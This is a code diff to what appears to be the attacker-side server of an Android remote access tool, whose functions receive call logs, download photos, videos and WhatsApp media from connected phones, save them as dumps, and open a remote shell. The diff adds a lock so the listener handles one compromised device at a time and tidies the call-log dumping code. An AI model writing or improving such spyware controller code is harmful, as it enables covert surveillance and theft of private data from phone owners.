@@ -22,6 +22,10 @@ sys.stdout.reconfigure(encoding='utf-8')
 # Global flag for graceful shutdown
 shutdown_flag = False
 
+# Global connection lock to prevent multiple simultaneous connections
+connection_lock = threading.Lock()
+active_connection = None
+
 def signal_handler(sig, frame):
     """Handle Ctrl+C gracefully"""
     global shutdown_flag
@@ -322,16 +326,16 @@ def callLogs(client):
     msg = recvall(client)
     filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
-    	msg.split("\n")
-    	print(msg.replace("END123","").strip())
-    	print(" ")
+        msg.split("\n")
+        print(msg.replace("END123","").strip())
+        print(" ")
     else:
-    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
+        with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
+            txt.write(msg)
+            txt.close()
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
+            if not os.path.getsize(filename):
+                os.remove(filename)
 
 def downloadMediaFile(client, filepath):
     """Download a media file (photo/video) from the device"""
@@ -1042,7 +1046,7 @@ def autoDownloadWhatsAppMediaOptimized(client, device_folder, max_files=10):
         return False
 
 def get_shell(ip,port):
-    global shutdown_flag
+    global shutdown_flag, connection_lock, active_connection
     soc = socket.socket() 
     soc = socket.socket(type=socket.SOCK_STREAM)
     try:
@@ -1056,7 +1060,7 @@ def get_shell(ip,port):
         soc.close()
         sys.exit(0)
 
-    soc.listen(2)
+    soc.listen(1)  # Changed from 2 to 1 - only accept one connection at a time
     soc.settimeout(1.0)  # Set timeout for accept() to allow checking shutdown_flag
     print(banner)
     
@@ -1073,10 +1077,6 @@ def get_shell(ip,port):
         try:
             print(stdOutput("info")+"\033[1mWaiting for Connections...\033[0m")
             conn, addr = soc.accept()
-            conn.settimeout(30.0)  # 30 second timeout
-            clear()
-            print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
-            print(" ")
         except socket.timeout:
             continue  # Timeout allows checking shutdown_flag
         except KeyboardInterrupt:
@@ -1084,7 +1084,25 @@ def get_shell(ip,port):
             soc.close()
             sys.exit(0)
         
+        # Connection accepted, now try to acquire lock
+        # Try to acquire the connection lock - reject if already busy
+        if not connection_lock.acquire(blocking=False):
+            print(stdOutput("warning")+"\033[1mConnection already active, rejecting new connection from " + str(addr))
+            try:
+                conn.send("SERVER_BUSY\n".encode("UTF-8"))
+                conn.close()
+            except:
+                pass
+            continue
+        
+        # Successfully acquired lock, handle this connection
         try:
+            active_connection = conn
+            conn.settimeout(30.0)  # 30 second timeout
+            clear()
+            print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
+            print(" ")
+            
             # Wait for and read the welcome message to get device info
             welcome_msg = ""
             device_identifier = None
@@ -1252,6 +1270,9 @@ def get_shell(ip,port):
             soc.close()
             sys.exit(0)
         finally:
+            # Release the lock when connection ends
+            active_connection = None
+            connection_lock.release()
             try:
                 conn.close()
             except:
